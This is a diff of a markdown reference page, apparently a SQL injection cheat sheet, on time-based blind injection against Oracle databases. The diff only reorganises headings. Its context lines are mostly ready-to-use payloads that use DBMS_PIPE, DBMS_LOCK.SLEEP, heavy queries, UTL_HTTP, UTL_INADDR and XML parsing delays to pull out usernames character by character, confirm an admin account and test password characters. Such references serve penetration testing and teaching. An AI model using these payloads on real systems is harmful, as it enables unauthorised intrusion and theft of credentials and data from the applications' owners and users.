@@ -7,11 +7,9 @@ tags: ["timing", "blind injection", "delay", "time-based"]
 lastUpdated: 2025-03-15
 ---
 
-## Timing
-
 Time-based techniques are essential for extracting information in blind SQL injection scenarios where no direct output is visible. By introducing deliberate delays based on conditions, attackers can infer data by measuring the response time of the application.
 
-### Oracle Delay Functions
+## Oracle Delay Functions
 
 Oracle provides several methods to introduce delays:
 
@@ -23,7 +21,7 @@ Oracle provides several methods to introduce delays:
 | `UTL_HTTP.REQUEST`            | HTTP request delay                     | `UTL_HTTP.REQUEST('http://slow-website.com')`                    | EXECUTE on UTL_HTTP   |
 | Heavy queries                 | CPU/IO intensive operations            | `SELECT COUNT(*) FROM all_objects a,all_objects b,all_objects c` | Basic SELECT          |
 
-### Basic Time-Based Injection
+## Basic Time-Based Injection
 
 ```sql
 -- Basic time delay (10 seconds)
@@ -33,7 +31,7 @@ Oracle provides several methods to introduce delays:
 ' AND (CASE WHEN (SELECT COUNT(*) FROM users)>0 THEN DBMS_PIPE.RECEIVE_MESSAGE('x',10) ELSE NULL END) IS NULL--
 ```
 
-### Using DBMS_PIPE.RECEIVE_MESSAGE
+## Using DBMS_PIPE.RECEIVE_MESSAGE
 
 This is the most commonly used delay function in Oracle:
 
@@ -48,7 +46,7 @@ This is the most commonly used delay function in Oracle:
 ' AND (CASE WHEN SUBSTR((SELECT username FROM users WHERE rownum=1),1,1)='a' THEN DBMS_PIPE.RECEIVE_MESSAGE('x',10) ELSE NULL END) IS NULL--
 ```
 
-### Using DBMS_LOCK.SLEEP
+## Using DBMS_LOCK.SLEEP
 
 If you have privileges:
 
@@ -60,7 +58,7 @@ If you have privileges:
 ' AND (CASE WHEN (ASCII(SUBSTR((SELECT username FROM users WHERE rownum=1),1,1)) & 1)=1 THEN DBMS_LOCK.SLEEP(10) ELSE NULL END) IS NULL--
 ```
 
-### Heavy Queries for Delay
+## Heavy Queries for Delay
 
 When no delay functions are available:
 
@@ -72,9 +70,9 @@ When no delay functions are available:
 ' AND (CASE WHEN SUBSTR((SELECT username FROM users WHERE rownum=1),1,1)='a' THEN (SELECT COUNT(*) FROM all_objects START WITH object_id=1 CONNECT BY PRIOR object_id=object_id) ELSE 0 END)>=0--
 ```
 
-### SQL Injection Examples
+## SQL Injection Examples
 
-#### Character-by-Character Extraction
+### Character-by-Character Extraction
 
 ```sql
 -- Extract first character of username
@@ -84,7 +82,7 @@ When no delay functions are available:
 ' AND (CASE WHEN ASCII(SUBSTR((SELECT username FROM users WHERE rownum=1),2,1))=98 THEN DBMS_PIPE.RECEIVE_MESSAGE('x',5) ELSE NULL END) IS NULL--
 ```
 
-#### Binary Search Algorithm
+### Binary Search Algorithm
 
 More efficient extraction using binary search:
 
@@ -98,7 +96,7 @@ More efficient extraction using binary search:
 -- Continue narrowing down the range
 ```
 
-#### Testing for Existence
+### Testing for Existence
 
 ```sql
 -- Check if table exists
@@ -108,9 +106,9 @@ More efficient extraction using binary search:
 ' AND (CASE WHEN (SELECT COUNT(*) FROM users WHERE username='admin')>0 THEN DBMS_PIPE.RECEIVE_MESSAGE('x',5) ELSE NULL END) IS NULL--
 ```
 
-### Alternative Delay Techniques
+## Alternative Delay Techniques
 
-#### Using UTL_INADDR
+### Using UTL_INADDR
 
 If DBMS_PIPE is not available:
 
@@ -119,21 +117,21 @@ If DBMS_PIPE is not available:
 ' AND (CASE WHEN (SELECT COUNT(*) FROM users)>0 THEN UTL_INADDR.GET_HOST_ADDRESS('nonexistent-subdomain.'||(SELECT DBMS_RANDOM.STRING('L',20) FROM DUAL)||'.example.com') ELSE '127.0.0.1' END) IS NOT NULL--
 ```
 
-#### Using UTL_HTTP
+### Using UTL_HTTP
 
 ```sql
 -- HTTP request delay
 ' AND (CASE WHEN (SELECT COUNT(*) FROM users)>0 THEN UTL_HTTP.REQUEST('http://slow-website.com') ELSE UTL_HTTP.REQUEST('http://fast-website.com') END) IS NOT NULL--
 ```
 
-#### Using XML Processing
+### Using XML Processing
 
 ```sql
 -- XML parsing delay
 ' AND (CASE WHEN (SELECT COUNT(*) FROM users)>0 THEN SYS.XMLTYPE.CREATEXML('<xml>'||(SELECT RPAD('a',4000,'a') FROM DUAL)||'</xml>') ELSE NULL END) IS NOT NULL--
 ```
 
-### Managing Timeout Risks
+## Managing Timeout Risks
 
 Application or database timeouts can interrupt time-based extraction:
 
@@ -145,7 +143,7 @@ Application or database timeouts can interrupt time-based extraction:
 ' AND (CASE WHEN ASCII(SUBSTR((SELECT username FROM users WHERE rownum=1),1,1))=97 THEN DBMS_PIPE.RECEIVE_MESSAGE('x',1) ELSE NULL END) IS NULL--
 ```
 
-### Combining with Other Techniques
+## Combining with Other Techniques
 
 ```sql
 -- Combining time-based with error-based
@@ -155,9 +153,9 @@ Application or database timeouts can interrupt time-based extraction:
 ' UNION SELECT CASE WHEN (SELECT COUNT(*) FROM users WHERE username='admin' AND SUBSTR(password,1,1)='a') > 0 THEN 'a'||DBMS_PIPE.RECEIVE_MESSAGE('x',5) ELSE 'b' END, NULL FROM DUAL--
 ```
 
-### Practical Considerations
+## Practical Considerations
 
-#### Measuring Response Time
+### Measuring Response Time
 
 For effective time-based extraction:
 
@@ -166,7 +164,7 @@ For effective time-based extraction:
 3. Make multiple requests to confirm results
 4. Consider network latency and server load variations
 
-#### Automating Extraction
+### Automating Extraction
 
 Use automation tools for efficient extraction:
 
